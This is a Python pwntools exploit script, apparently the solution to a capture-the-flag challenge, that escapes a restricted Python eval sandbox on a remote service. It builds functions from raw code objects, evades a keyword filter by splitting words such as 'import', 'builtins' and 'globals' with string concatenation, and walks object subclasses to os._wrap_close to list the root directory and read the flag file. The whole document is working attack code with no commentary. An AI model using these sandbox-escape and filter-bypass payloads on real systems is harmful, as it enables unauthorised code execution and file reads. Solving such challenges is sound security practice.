from pwn import *


def generator(func):
    co = func.__code__
    return f'''
[
    func_class:=(lambda:None).__class__,
    code_class:=(_ for _ in ()).gi_code.__class__,
    func_class(
        code_class({co.co_argcount}, 0, {co.co_kwonlyargcount}, {co.co_nlocals},
                    {co.co_stacksize}, {co.co_flags}, {co.co_code}, {co.co_consts}, {co.co_names},
                    {co.co_varnames}, "filename.py", "meow_func", {co.co_firstlineno}, b""
        )
        , {{}}
    )
][-1]()'''.replace("    ", "").replace("\n", "")


def bypasser(payload):
    return payload.replace("base", "ba'+'se")\
        .replace("subclasses", "subcl'+'asses")\
        .replace("__dict__", "__di'+'ct__")\
        .replace("import", "imp'+'ort")\
        .replace("builtins", "buil'+'tins")\
        .replace("module", "mod'+'ule")\
        .replace("globals", "glob'+'als")


if __name__ == "__main__":
    r = remote("eofqual.zoolab.org", 5566)

    print("[+] dump object subclasses")

    def get_subclass():
        return ().__class__.__base__.__subclasses__()
    payload = generator(get_subclass)
    payload = bypasser(payload)
    r.recvuntil("JohnTitor@IBM5100:~$ ")
    print(payload)
    r.sendline(payload)

    subclasses = r.recvline().strip()[1:-1]
    subclasses = subclasses.split(b", ")
    offset = subclasses.index(b"<class 'os._wrap_close'>")
    print("[+] os._wrap_close offset =", offset)

    print("[+] using gadget: <class 'os._wrap_close'> to listdir")

    def listdir():
        return ().__class__.__base__.__subclasses__()[1337].__init__.__globals__['listdir']
    payload = generator(listdir).replace("1337", str(offset))
    payload = bypasser(payload)
    r.recvuntil("JohnTitor@IBM5100:~$ ")
    print(payload)
    r.sendline(f"{payload}('/')")
    files = eval(r.recvline())  # wow you use eval, sO sAfE
    print(files)
    flag_path = files[-1]
    print("[+] flag is in", flag_path)

    print("[+] open & read the flag")

    def builtin_open():
        return ().__class__.__base__.__subclasses__()[1337].__init__.__globals__['sys'].modules['builtins'].open("FLAG_PATH").read()
    payload = generator(builtin_open).replace("1337", str(offset)).replace("FLAG_PATH", flag_path)
    payload = bypasser(payload)
    r.recvuntil("JohnTitor@IBM5100:~$ ")
    print(payload)
    r.sendline(payload)
    r.interactive()
